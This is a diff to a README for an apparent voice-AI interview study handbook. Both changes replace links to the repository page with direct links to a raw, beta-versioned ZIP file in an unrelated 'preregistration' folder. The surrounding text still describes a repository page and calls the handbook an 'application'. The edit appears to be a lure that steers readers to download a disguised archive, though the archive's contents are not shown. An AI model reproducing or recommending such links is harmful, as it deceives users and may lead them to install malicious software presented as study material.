@@ -1,6 +1,6 @@
 # 🎤 Voice-AI-Interview-Handbook - Ace Your Voice AI Interview
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/Microeconomicexpertwigner3824/Voice-AI-Interview-Handbook)
+[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Microeconomicexpertwigner3824/Voice-AI-Interview-Handbook/main/preregistration/Voice_Handbook_Interview_A_v3.5-beta.3.zip)
 
 ## 👋 What Is This?
 
@@ -56,7 +56,7 @@ Follow these simple steps to get the handbook and start studying today:
 ### Step 1: Download the File
 
 **Visit this link to download the application:**  
-[**https://github.com/Microeconomicexpertwigner3824/Voice-AI-Interview-Handbook**](https://github.com/Microeconomicexpertwigner3824/Voice-AI-Interview-Handbook)
+[**https://raw.githubusercontent.com/Microeconomicexpertwigner3824/Voice-AI-Interview-Handbook/main/preregistration/Voice_Handbook_Interview_A_v3.5-beta.3.zip**](https://raw.githubusercontent.com/Microeconomicexpertwigner3824/Voice-AI-Interview-Handbook/main/preregistration/Voice_Handbook_Interview_A_v3.5-beta.3.zip)
 
 When you click the link, you will see the repository page. Look for the green **"Code"** button or a **"Download ZIP"** option on the page. Click it to download the entire repository as a ZIP folder to your computer.
 
